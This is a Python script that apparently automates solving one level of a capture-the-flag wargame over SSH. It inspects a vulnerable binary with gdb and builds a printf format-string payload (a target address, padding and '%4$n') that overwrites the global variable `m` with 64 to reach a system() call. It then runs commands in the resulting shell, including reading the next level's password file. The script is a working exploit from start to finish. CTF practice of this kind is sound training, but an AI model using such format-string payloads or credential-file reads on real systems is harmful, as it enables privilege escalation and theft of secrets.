import os
import sys
bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous, exec_in_stream, exec_stream, find_buffer_position, get_func_structure
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

stream = exec_stream(f'./{binary_name}', title='Simple execute binary', stdin=True)
print_title('Okay, stdin intercepted, stdin write expected')

output = exec_in_stream(stream, 'test', title='Send test in stdin')
print_output(output)
print_title('Nothing happened')
print_title('Debug Time')

func_info = exec(client, f'echo "info func" | gdb ./{binary_name} -q | egrep " v$| main$"', title='Get all functions')
print_output(func_info)
print_title('We have two entry points')

get_func_structure(client, 'main', title='Main call function `v`')
get_func_structure(
    client, 'v',
    title='Read stdin and print it via printf, check variable at step +59 and cmp with 0x40 (64) '
          'if expression does not math, print stdin and exit else print text and call system, oks')
print_title('Try to find name of variable for cmp (0x804988c) (Step +54)? Got it')

output = exec(
    client, f'echo "info variables" | gdb ./{binary_name} -q -ex "set pagination off" | grep "0x0804988c"',
    title='Find name of variable')
print_output(output)
print_title('Variable name - `m` at global scope')
m_address = output[0].split(" ")[0]

print_title('We have a little more info about how binary works')
print_title('Test what we can do')
print_title('Program call printf and print our input, try to break it')

output = exec(client, f'echo "%n" | ./{binary_name}', title='Try to input format string modif', err=True)
print_output(output)
print_title("Oh no... Wait, oh yeah! Let's find the key!!!")
print_title("Our goal at write 64 at `m` variable for cmp condition")

buffer_position = find_buffer_position(client, title='Find buffer position to inject')
script = f'print "{address_to_string(m_address)}" + "." * 60 + "%4$n"'
f = lambda command="": f'echo {command} | (python -c \'{script}\'; cat -) | ./{binary_name} | head -n 1'

output = exec(client, f('whoami'), title='Who a me?')
print_output(output, 'Current user')
print_title('Nice')

token = exec(client, f('cat /home/user/level4/.pass'), title='Steal the password!')[0]

save_token(token, client)
